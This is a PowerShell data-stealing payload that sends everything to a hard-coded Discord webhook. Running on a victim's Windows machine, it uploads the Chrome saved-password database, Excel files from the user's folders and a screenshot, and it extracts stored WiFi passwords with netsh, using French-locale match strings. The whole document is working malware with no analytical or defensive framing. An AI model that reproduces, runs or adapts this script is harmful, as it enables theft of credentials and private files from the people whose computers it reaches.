# ===== PAYLOAD: DUMP ENCRYPTED CHROME DATABASE =====
$webhook = "https://ptb.discord.com/api/webhooks/1484372266710995026/jhpU0776tLsCjRN_RiwfH5PFTHg1XaZQJOTcdw0FEBtANImdnEZ4cjf6sT_sh8mHgdbU"

function Send-Discord {
    param($msg)
    try { Invoke-RestMethod -Uri $webhook -Method Post -Body (@{content=$msg}|ConvertTo-Json) -ContentType "application/json" } catch {}
}

function Send-File {
    param($path)
    try { Invoke-RestMethod -Uri $webhook -Method Post -Form @{file=Get-Item $path} } catch {}
}

# Start
Send-Discord "🚀 STARTED on $env:COMPUTERNAME - $env:USERNAME"

# 1. Chrome passwords (encrypted)
$chromeDb = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
if (Test-Path $chromeDb) {
    $tempDb = "$env:temp\chrome_passwords.db"
    Copy-Item $chromeDb $tempDb -Force
    Send-File $tempDb
    Send-Discord "🔐 Chrome DB dumped (decrypt on your machine)"
    Remove-Item $tempDb -Force
} else {
    Send-Discord "❌ Chrome not found"
}

# 2. Excel files
$excelFiles = @(Get-ChildItem "C:\Users\$env:USERNAME\Desktop","C:\Users\$env:USERNAME\Documents","C:\Users\$env:USERNAME\Downloads" -Filter "*.xlsx" -File -ErrorAction SilentlyContinue)
foreach ($file in $excelFiles) {
    if ($file.Length -lt 8MB) {
        $temp = "$env:temp\$($file.Name)"
        Copy-Item $file.FullName $temp -Force
        Send-File $temp
        Remove-Item $temp -Force
    }
}
if ($excelFiles.Count -gt 0) { Send-Discord "📊 $($excelFiles.Count) Excel files sent" }

# 3. Screenshot
try {
    Add-Type -AssemblyName System.Windows.Forms,System.Drawing
    $screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
    $bmp = New-Object System.Drawing.Bitmap $screen.Width,$screen.Height
    $g = [System.Drawing.Graphics]::FromImage($bmp)
    $g.CopyFromScreen($screen.X,$screen.Y,0,0,$bmp.Size)
    $ss = "$env:temp\screen.png"
    $bmp.Save($ss)
    Send-File $ss
    Remove-Item $ss -Force
    Send-Discord "📸 Screenshot sent"
} catch { Send-Discord "❌ Screenshot failed" }

# 4. WiFi passwords
try {
    $wifi = netsh wlan show profiles | Select-String "Profil utilisateur"
    foreach ($line in $wifi) {
        $name = ($line -split ":")[1].Trim()
        $pass = netsh wlan show profile name="$name" key=clear | Select-String "Contenu de la clé"
        if ($pass) { Send-Discord "📶 $name : $(($pass -split ':')[1].Trim())" }
    }
} catch {}

Send-Discord "✅ DONE"
